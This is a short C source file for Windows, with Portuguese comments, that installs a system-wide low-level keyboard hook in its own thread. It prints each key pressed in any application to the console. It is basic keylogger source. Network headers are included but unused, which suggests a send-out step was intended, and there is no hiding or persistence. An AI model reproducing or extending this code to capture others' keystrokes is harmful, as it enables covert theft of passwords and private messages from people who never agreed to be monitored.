
#include <stdlib.h>
#include <windows.h>
#include <stdio.h>
#include <winsock.h>
#include <winsock2.h>













LRESULT CALLBACK hook(int codigo, WPARAM c, LPARAM

    d)

{



    if (codigo == HC_ACTION)

    {

        switch (c)

        {

            case WM_KEYDOWN:

            case WM_SYSKEYDOWN:

           // case WM_KEYUP:

            case WM_SYSKEYUP:

                {

                    PKBDLLHOOKSTRUCT m = (PKBDLLHOOKSTRUCT) d;

                    printf("%c", m->vkCode);

                    break;

                }

        }

    }

    return( CallNextHookEx(NULL, codigo, c,

        d));

}


void loopmessage(){
    MSG  msg;
    BOOL bRet;
    GetMessage( &msg, NULL, 0, 0 );
   while( (bRet = GetMessage( &msg, NULL, 0, 0 )) != 0)
{
    if (bRet == -1)
    {
        // handle the error and possibly exit
    }
    else
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}


}
DWORD WINAPI hook_injection(){
HINSTANCE  i=GetModuleHandle(NULL);  //recupera um um indentificador para uma janela
HHOOK k =SetWindowsHookEx(WH_KEYBOARD_LL,hook,i,0);//Funçao de gancho para uma janela qualquer que recupera o estado das teclas digitadas
loopmessage();// loop de mensagens
UnhookWindowsHookEx(k);
return 0;
}


int main(){

DWORD w;
 HANDLE l=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)hook_injection,NULL,0,&w);
if(l){
    return WaitForSingleObject(l,INFINITE);

}
else{

    return 1;
}


    return 0;
}
